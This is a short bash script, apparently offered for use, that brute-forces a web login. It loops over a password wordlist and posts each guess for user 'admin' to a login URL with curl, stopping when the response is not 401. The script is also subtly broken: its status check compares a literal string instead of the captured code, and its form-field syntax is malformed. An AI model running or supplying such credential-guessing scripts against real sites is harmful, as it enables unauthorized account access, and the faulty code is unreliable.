#!/usr/bin/env bash

wordlist="pw.txt"

payload="username=admin;password="

posturl="https://example.org/login"

while read -r pass; do
	code=$( curl -s -o /dev/null -w "%{http_code}" --form "${payload}${pass}"  "$posturl" )
	if [ code != 401 ]; then
		echo "$pass"
		exit 0
	fi

done < "$wordlist"
